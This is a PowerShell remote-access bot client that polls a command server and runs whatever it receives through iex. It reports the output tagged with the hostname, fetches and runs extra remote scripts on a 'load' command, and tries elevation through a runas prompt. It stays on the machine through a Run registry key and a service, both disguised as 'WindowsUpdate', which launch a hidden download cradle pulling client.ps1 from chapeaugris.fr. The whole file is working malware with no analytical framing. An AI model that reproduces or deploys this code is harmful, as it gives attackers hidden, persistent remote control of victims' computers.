$SRVURL = 'http://localhost:8080'
$BOTID = $(hostname)
$REGKEY_NAME = "WindowsUpdate"
$REGKEY_VAL = $env:temp + "\winupdate.vbs"

function user-persist() {
    echo 'Set oShell = WScript.CreateObject ("WScript.Shell")' > $REGKEY_VAL
    echo 'oShell.run "powershell -WindowStyle Hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString(''http://chapeaugris.fr/public/client.ps1'')""", 0' >> $REGKEY_VAL
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $REGKEY_NAME -Value $REGKEY_VAL
    SendOutput "User persistence OK";
}

function admin-persist() {
    # Remove user persistence (if any)
    $autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
    if ($autoruns.$REGKEY_NAME) {
        Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $REGKEY_NAME
    }
   
    # Persistent Script
    echo 'Set oShell = WScript.CreateObject ("WScript.Shell")' > $REGKEY_VAL
    echo 'oShell.run "powershell -WindowStyle Hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString(''http://chapeaugris.fr/public/client.ps1'')""", 0' >> $REGKEY_VAL
    
    cmd.exe /c sc create WindowsUpdate binPath= "wscript.exe $REGKEY_VAL" start= auto

    SendOutput "Admin persistence OK";
}

function elevate() {
   # Get the ID and security principal of the current user account
    $myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
    $myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)

    # Get the security principal for the Administrator role
    $adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator

    # Check to see if we are currently running "as Administrator"
    if ($myWindowsPrincipal.IsInRole($adminRole))
    {
        SendOutput "Already admin !";
        return;
    }

    else
    {
       # We are not running "as Administrator" - so relaunch as administrator

       # Create a new process object that starts PowerShell
       $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell"; 

       # Specify the current script path and name as a parameter
       $newProcess.Arguments = "-WindowStyle Hidden -c ""iex (New-Object Net.WebClient).DownloadString('http://chapeaugris.fr/public/client.ps1')""";

       # Indicate that the process should be elevated
       $newProcess.Verb = "runas";  

       # Start the new process
       [System.Diagnostics.Process]::Start($newProcess);

       SendOutput "Elevating...";

       # Exit from the current, unelevated, process
       exit
    }
}

function sendOutput() {
     param (
        [string]$output = ""
     )

    $NVC = New-Object System.Collections.Specialized.NameValueCollection;
    $NVC.Add("botid", $BOTID);
    $NVC.Add("output", $output);

    $WC = New-Object System.Net.WebClient
    $Result = $WC.UploadValues($SRVURL + "/api/report","post", $NVC);

    $WC.Dispose();
}


function getCmd() {
    return (New-Object Net.WebClient).DownloadString($SRVURL + '/api/pop?botid=' + $BOTID + '&sysinfo=powershell');
}


$output = ''
do {
    try {
        $cmd = getCmd;
        echo $cmd
        
        
        if ($cmd) {
            if ($cmd -eq "elevate") {
                elevate
            }
            elseif ($cmd -eq "user-persist") {
                user-persist
            }
            elseif ($cmd -eq "admin-persist") {
                admin-persist
            }
            elseif ($cmd.StartsWith("load ")) {
                $output = [string](iex (New-Object Net.WebClient).DownloadString((-split $cmd)[1]))
            }
            else {
                try {
                    $output = [string](iex $cmd)
                }
                catch {
                    $output = $_.Exception.Message
                }                
                echo $output
                if ($output) {
                    SendOutput $output;
                }
            }
        }
        else {
            Start-Sleep 10
        }
    }
    catch {
        echo $_.Exception.Message;
    }
} while ($true)
